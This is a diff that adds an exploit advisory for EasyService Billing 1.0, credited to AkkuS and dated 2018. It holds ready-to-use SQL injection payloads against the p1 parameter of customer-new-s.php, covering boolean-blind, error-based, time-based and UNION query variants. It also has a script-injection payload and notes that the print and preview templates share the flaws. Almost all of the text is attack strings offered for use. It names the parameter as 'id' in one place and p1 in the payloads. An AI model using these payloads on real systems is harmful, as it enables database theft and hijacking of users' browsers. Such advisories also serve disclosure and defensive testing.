@@ -1,0 +1,49 @@
+# Exploit Title: EasyService Billing 1.0 - 'customer-new-s.php' SQL
+Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 22.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/easyservice-billing-php-scripts-for-quotation-invoice-payments-etc/16687594
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : all of the print and preview pages have the same vulnerabilities. (template_SBilling.php, template_Receipt.php, template_SBillingPerforma.php,template_SBillingQuotation.php)
+  All of them use the same parameters. An attacker can use any of these.
+====================================================
+
+# PoC : SQLi :
+
+Parameter : id
+
+     Type : boolean-based blind
+     Demo :
+http://test.com/EasyServiceBilling/customer-new-s.php?p1=akkus+keyney
+  Payload : Payload: p1=akkus+keyney' AND 1815=1815 AND 'izgU'='izgU
+
+     Type : error-based
+     Demo :
+http://test.com/EasyServiceBilling/customer-new-s.php?p1=akkus+keyney
+  Payload : p1=akkus+keyney' AND (SELECT 2882 FROM(SELECT
+COUNT(*),CONCAT(0x7162627171,(SELECT
+(ELT(2882=2882,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'UFGx'='UFGx
+
+     Type : AND/OR time-based blind
+     Demo :
+http://test.com/EasyServiceBilling/customer-new-s.php?p1=akkus+keyney
+  Payload : p1=akkus+keyney' AND SLEEP(5) AND 'TJOA'='TJOA
+
+     Type : UNION query
+     Demo :
+http://test.com/EasyServiceBilling/customer-new-s.php?p1=akkus+keyney
+  Payload : p1=akkus+keyney' UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162627171,0x4e70435a69565a6248565947566b74614e7a5969635671587073454f75726f53795477506d514567,0x717a6b6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+
+
+
+====================================================
+# PoC : XSS :
+
+  Payload :
+http://test.com/EasyServiceBilling/customer-new-s.php?p1='
+</script><script>alert(1)</script>‘;
